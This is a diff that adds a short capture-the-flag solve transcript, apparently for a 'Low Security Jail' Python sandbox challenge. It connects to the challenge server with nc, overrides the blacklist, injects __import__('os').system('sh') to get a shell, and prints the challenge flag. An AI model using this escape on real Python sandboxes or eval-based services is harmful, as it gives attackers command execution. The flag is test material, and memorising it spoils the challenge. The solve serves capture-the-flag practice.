@@ -1,0 +1,9 @@
+$ nc 34.173.236.50 49000
+Welcome to the Low Security Jail!
+Enter command to execute: blacklist=str
+Enter command to execute: __import__('os').system('sh')
+ls
+run
+super_secret_flag.txt
+cat super_secret_flag.txt
+ictf{r34lly_l0w_s3cur17y_j41l_7d4f6b3a}
